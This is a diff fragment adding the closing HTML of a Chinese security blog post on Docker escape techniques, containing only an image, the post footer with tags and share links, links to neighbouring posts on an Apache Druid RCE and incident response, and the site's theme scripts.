+        data-srcset="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160424.png-water_print, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160424.png-water_print 1.5x, https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160424.png-water_print 2x"
+        data-sizes="auto"
+        alt="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160424.png-water_print"
+        title="https://geekby.oss-cn-beijing.aliyuncs.com/MarkDown/20210203160424.png-water_print" /></p>
+</div><div class="post-footer" id="post-footer">
+    <div class="post-info">
+        <div class="post-info-line">
+            <div class="post-info-mod">
+                <span>更新于 2021-02-03</span>
+            </div>
+            <div class="post-info-license"></div>
+        </div>
+        <div class="post-info-line">
+            <div class="post-info-md"></div>
+            <div class="post-info-share">
+                <span><a href="javascript:void(0);" title="分享到 微博" data-sharer="weibo" data-url="https://www.geekby.site/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/" data-title="Docker 逃逸相关总结"><i class="fab fa-weibo fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Evernote" data-sharer="evernote" data-url="https://www.geekby.site/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/" data-title="Docker 逃逸相关总结"><i class="fab fa-evernote fa-fw"></i></a><a href="javascript:void(0);" title="分享到 Skype" data-sharer="skype" data-url="https://www.geekby.site/2021/02/docker%E9%80%83%E9%80%B8%E7%9B%B8%E5%85%B3%E6%80%BB%E7%BB%93/" data-title="Docker 逃逸相关总结"><i class="fab fa-skype fa-fw"></i></a></span>
+            </div>
+        </div>
+    </div>
+
+    <div class="post-info-more">
+        <section class="post-tags"><i class="fas fa-tags fa-fw"></i>&nbsp;<a href="/tags/%E4%BA%91%E5%8E%9F%E7%94%9F%E5%AE%89%E5%85%A8/">云原生安全</a>,&nbsp;<a href="/tags/docker/">Docker</a></section>
+        <section>
+            <span><a href="javascript:void(0);" onclick="window.history.back();">返回</a></span>&nbsp;|&nbsp;<span><a href="/">主页</a></span>
+        </section>
+    </div>
+
+    <div class="post-nav"><a href="/2021/02/cve-2021-25646-druid%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/" class="prev" rel="prev" title="CVE-2021-25646 - Apache Druid RCE 复现"><i class="fas fa-angle-left fa-fw"></i>CVE-2021-25646 - Apache Druid RCE 复现</a>
+            <a href="/2021/03/%E5%BA%94%E6%80%A5%E5%93%8D%E5%BA%94/" class="next" rel="next" title="应急响应">应急响应<i class="fas fa-angle-right fa-fw"></i></a></div>
+</div>
+</article></div>
+            </main><footer class="footer">
+        <div class="footer-container"><div class="footer-line"><i class="far fa-copyright fa-fw"></i><span itemprop="copyrightYear">2019 - 2021</span><span class="author" itemprop="copyrightHolder">&nbsp;<a href="/" target="_blank">Geekby</a></span>&nbsp;|&nbsp;<span class="license"><a rel="license external nofollow noopener noreffer" href="https://creativecommons.org/licenses/by-nc/4.0/" target="_blank">CC BY-NC 4.0</a></span></div>
+        </div>
+    </footer></div>
+
+        <div id="fixed-buttons"><a href="#" id="back-to-top" class="fixed-button" title="回到顶部">
+                <i class="fas fa-arrow-up fa-fw"></i>
+            </a><a href="#" id="view-comments" class="fixed-button" title="查看评论">
+                <i class="fas fa-comment fa-fw"></i>
+            </a>
+        </div><link rel="stylesheet" href="/lib/lightgallery/lightgallery.min.css"><script type="text/javascript" src="/lib/smooth-scroll/smooth-scroll.min.js"></script><script type="text/javascript" src="/lib/autocomplete/autocomplete.min.js"></script><script type="text/javascript" src="/lib/algoliasearch/algoliasearch-lite.umd.min.js"></script><script type="text/javascript" src="/lib/lazysizes/lazysizes.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lightgallery.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-thumbnail.min.js"></script><script type="text/javascript" src="/lib/lightgallery/lg-zoom.min.js"></script><script type="text/javascript" src="/lib/clipboard/clipboard.min.js"></script><script type="text/javascript" src="/lib/sharer/sharer.min.js"></script><script type="text/javascript">window.config={"code":{"copyTitle":"复制到剪贴板","maxShownLines":100},"comment":{},"lightGallery":{"actualSize":false,"exThumbImage":"data-thumbnail","hideBarsDelay":2000,"selector":".lightgallery","speed":400,"thumbContHeight":80,"thumbWidth":80,"thumbnail":true},"search":{"algoliaAppID":"C19A58DMI2","algoliaIndex":"blog","algoliaSearchKey":"a7203b4397475a3fcf49cea4495e0987","highlightTag":"em","maxResultLength":10,"noResultsFound":"没有找到结果","snippetLength":50,"type":"algolia"}};</script><script type="text/javascript" src="/js/theme.min.js"></script></body>
+</html>
